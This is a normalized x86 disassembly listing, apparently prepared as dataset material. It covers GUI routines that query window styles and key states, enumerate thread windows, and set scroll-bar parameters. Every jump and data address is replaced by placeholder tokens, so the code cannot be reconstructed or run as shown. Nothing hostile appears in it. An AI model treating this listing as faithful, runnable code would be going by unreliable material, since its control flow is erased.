test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_46429c
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_464238
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4642f8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_464318
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4642f8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_464344
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_46adac
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_46b21c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407dcc
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ad98
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46b208
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407dcc
test eax eax
je r-xdata
sub_4643cc
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_464420
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_46445c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_4644a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464506
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46205c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404108
mov eax [ ebp - 0x8 ]
pop edx
call sub_407dcc
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46450d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
sub_464518
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_464540
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_4645b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_464518
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4645b8
lea eax [ ebp - 0xc ]
call sub_403f20
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
sub_4645c0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403160
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_464650
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418a84
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_464f18
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_464ef8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_464da8
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4646a0
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_464858
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44d800
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_464da8
xor edx edx
mov eax ebx
call sub_464da8
jmp r-xdata
sub_4646d8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a924
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_464744
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a924
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4647ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_464ee0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4507b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_464ee0
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_45077c
call sub_464744
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_45077c
call sub_4646d8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_464858
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_453a88
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_464890
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_4648c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_464890
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_464890
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_464940
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_4648c4
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44cb90
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_4648c4
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44cbd4
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4649d8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_464a38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_464c09 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_464940
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_464940
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_464da8
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
push ebp
call sub_4649d8
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
push ebp
call sub_4649d8
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406aa8
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_464da8
jmp r-xdata
sub_464d30
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_465420
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_464da8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_453a88
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_453a88
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_453640
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_453640
jmp r-xdata
call sub_464518
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_464e6c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_465420
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_464f24
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
call sub_42c6d8
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
call sub_42c6d8
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
call sub_42c6d8
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423580
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
call sub_42c6d8
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
call sub_42c6d8
sub_46502c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_464940
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_464940
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_464f24
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453a88
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_464da8
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_464940
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_465144
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f7b4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4645c0
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4645c0
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4651bc
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403190
mov eax [ esi + 0x20c ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_465208
push ebx
mov ebx eax
mov eax ebx
call sub_450a40
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_465420
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c094
test al al
jne r-xdata
mov eax ebx
call sub_453a88
push eax
call sub_42c70c
sub_465248
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4653a0
mov ecx edi
mov edx esi
mov eax ebx
call sub_450188
pop edi
pop esi
pop ebx
retn
sub_465288
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_465390
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44cb90
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_464858
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_464da8
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45077c
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45077c
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_418314
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44c8fc
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465397
mov eax [ ebp - 0x10 ]
call sub_403190
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4646a0
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_418470
xor ecx ecx
mov edx 0xb03e
call sub_44e340
inc ebx
dec esi
jne r-xdata
sub_4653c4
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
